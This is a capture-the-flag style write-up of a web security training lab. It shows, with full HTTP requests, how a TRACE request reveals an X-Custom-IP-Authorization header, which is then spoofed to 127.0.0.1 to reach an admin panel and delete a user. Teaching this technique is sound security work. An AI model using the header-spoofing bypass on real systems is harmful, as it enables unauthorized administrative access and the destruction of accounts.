# Authentication bypass via information disclosure

<aside>
❓ This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

</aside>

Let’s start by logging in with the credentials provided `wiener:peter`.

```
GET /my-account?id=wiener HTTP/2
Host: 0afa00d1034b3ac28c8527e00072003e.web-security-academy.net
Cookie: session=iN2HcoeKV2p3ZTx2tAwRcQltndk8C0nT
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0afa00d1034b3ac28c8527e00072003e.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

The lab mentions a custom HTTP header being used, we can head over to Repeater and alter the `GET` request use the `TRACE` request method instead to debug the response being sent back from the server.

```
HTTP/2 200 OK
Content-Type: message/http
X-Frame-Options: SAMEORIGIN
Content-Length: 864

TRACE /admin HTTP/1.1
Host: 0afa00d1034b3ac28c8527e00072003e.web-security-academy.net
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
accept-language: en-US,en;q=0.9
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-fetch-site: same-origin
sec-fetch-mode: navigate
sec-fetch-dest: document
referer: https://0afa00d1034b3ac28c8527e00072003e.web-security-academy.net/login
accept-encoding: gzip, deflate, br
priority: u=0, i
cookie: session=iN2HcoeKV2p3ZTx2tAwRcQltndk8C0nT
Content-Length: 0
X-Custom-IP-Authorization: YOUR.PUBLIC.IP.ADDRESS
```

![image.png](Authentication%20bypass%20via%20information%20disclosure/1.png)

# The Vulnerability

As you can see in the server response, there is a `X-Custom-IP-Authorization` custom HTTP header being used to authorize what IP’s are allowed to view the admin page. I assume if I change the IP address to `127.0.0.1` the server will think that I am accessing the admin page from within the servers network. We can simply add this HTTP custom header to our `GET` request and send it with the value `127.0.0.1` like so:

```
GET /admin HTTP/2
Host: 0afa00d1034b3ac28c8527e00072003e.web-security-academy.net
Cookie: session=iN2HcoeKV2p3ZTx2tAwRcQltndk8C0nT
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://0afa00d1034b3ac28c8527e00072003e.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Custom-Ip-Authorization: 127.0.0.1
```

![image.png](Authentication%20bypass%20via%20information%20disclosure/2.png)

This will then give us a 200 status response to the admin page, at this point we can send this session to the Burp browser by clicking `Request in browser` and selecting one of the two following options

![image.png](Authentication%20bypass%20via%20information%20disclosure/3.png)

or we can intercept the requests and step through them in the `Proxy` tab, either way we will need to add the custom `X-Custom-IP-Authorization` header to the request before in order to successfully delete the user. Below is what the final request should look like to delete the user `Carlos` and complete the lab.

```
GET /admin/delete?username=carlos HTTP/2
Host: 0afa00d1034b3ac28c8527e00072003e.web-security-academy.net
Cookie: session=iN2HcoeKV2p3ZTx2tAwRcQltndk8C0nT
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afa00d1034b3ac28c8527e00072003e.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
X-Custom-Ip-Authorization: 127.0.0.1
```